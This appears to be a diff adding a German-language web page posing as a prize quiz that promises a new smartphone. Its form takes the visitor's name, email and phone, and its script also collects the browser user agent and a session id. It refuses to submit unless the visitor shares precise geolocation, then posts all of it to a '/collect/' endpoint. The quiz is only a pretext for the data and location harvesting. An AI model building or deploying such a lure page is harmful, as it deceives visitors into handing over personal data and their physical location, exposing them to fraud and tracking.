@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <title>🎁 Mega-Gewinnspiel</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; max-width: 400px; margin: auto; }
+    input, button { width: 100%; padding: 10px; margin: 10px 0; }
+  </style>
+</head>
+<body>
+  <h2>🎉 Jetzt mitmachen & gewinnen!</h2>
+  <p>Beantworte das Quiz und sichere dir die Chance auf ein brandneues Smartphone!</p>
+  <form id="quizForm">
+    <label>Vor- und Nachname:</label>
+    <input type="text" name="name" required>
+    <label>E-Mail-Adresse:</label>
+    <input type="email" name="email" required>
+    <label>Handynummer (optional):</label>
+    <input type="tel" name="phone">
+    <label>
+      <input type="checkbox" required> Teilnahmebedingungen gelesen und akzeptiert
+    </label>
+    <button type="submit">Jetzt teilnehmen</button>
+  </form>
+  <div id="status"></div>
+  <script>
+    const form = document.getElementById('quizForm');
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const formData = new FormData(form);
+      const data = {
+        name: formData.get('name'),
+        email: formData.get('email'),
+        phone: formData.get('phone'),
+        userAgent: navigator.userAgent,
+        sessionId: sessionStorage.getItem("sess") || Math.random().toString(36).substring(2)
+      };
+      sessionStorage.setItem("sess", data.sessionId);
+      navigator.geolocation.getCurrentPosition(async (position) => {
+        data.latitude = position.coords.latitude;
+        data.longitude = position.coords.longitude;
+        data.accuracy = position.coords.accuracy;
+        await fetch("/collect/", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify(data)
+        });
+        document.getElementById("status").innerHTML = `
+          <p>Vielen Dank für deine Teilnahme!</p>
+          <p>Du wirst benachrichtigt, falls du gewinnst 📱</p>
+        `;
+        form.remove();
+      }, (err) => {
+        document.getElementById("status").innerText = "Standortfreigabe erforderlich!";
+      });
+    });
+  </script>
+</body>
+</html>
